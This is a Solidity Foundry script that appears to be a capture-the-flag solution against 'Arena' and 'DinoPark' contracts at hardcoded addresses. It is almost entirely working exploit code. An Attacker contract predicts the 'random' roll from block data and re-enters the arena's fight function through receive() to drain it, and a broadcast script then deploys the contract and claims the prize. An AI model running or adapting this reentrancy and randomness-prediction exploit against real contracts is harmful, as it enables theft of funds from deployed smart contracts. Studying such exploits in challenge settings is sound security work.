// script/Attack.s.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Script.sol";

// --- Interfaces ---
interface IArena {
    function fight(uint8 guess, uint8 mode) external;
}

interface IDinoPark {
    function claimGoldenEgg() external;
}

// --- The Attacker Contract ---
contract Attacker {
    IArena public immutable arena;
    IDinoPark public immutable dinoPark;
    uint256 public reentrancyCounter = 0;
    uint8 public luckyRoll;

    constructor(address _arena, address _dinoPark) {
        arena = IArena(_arena);
        dinoPark = IDinoPark(_dinoPark);
    }

    function pwn() external {
        luckyRoll = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 100);
        require(luckyRoll > 30, "Bad roll, try again in the next block.");
        arena.fight(luckyRoll, 0);
    }
    
    // This is the critical function that fixes the "Not a champion!" error
    function claim() external {
        dinoPark.claimGoldenEgg();
    }

    receive() external payable {
        if (reentrancyCounter < 5) {
            reentrancyCounter++;
            arena.fight(luckyRoll, 0);
        }
    }
}


// --- The Script to Run the Attack ---
contract AttackScript is Script {
    function run() external {
        // You can hardcode your current instance addresses here if you want
      address dinoParkAddr = 0x49f5a049aE9d49dAD957F1501E43138b214d772e;
        address arenaAddr = 0x24faAdEfb015Bd8e42f361bCBDc1bdc86a4D24F6;

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        // 1. Deploy the Attacker
        Attacker attacker = new Attacker(arenaAddr, dinoParkAddr);

        // 2. Call pwn() to become champion and drain the Arena
        attacker.pwn{gas: 2_000_000}();

        // 3. Call the new claim() function ON THE ATTACKER CONTRACT
        attacker.claim();
        
        vm.stopBroadcast();
    }
}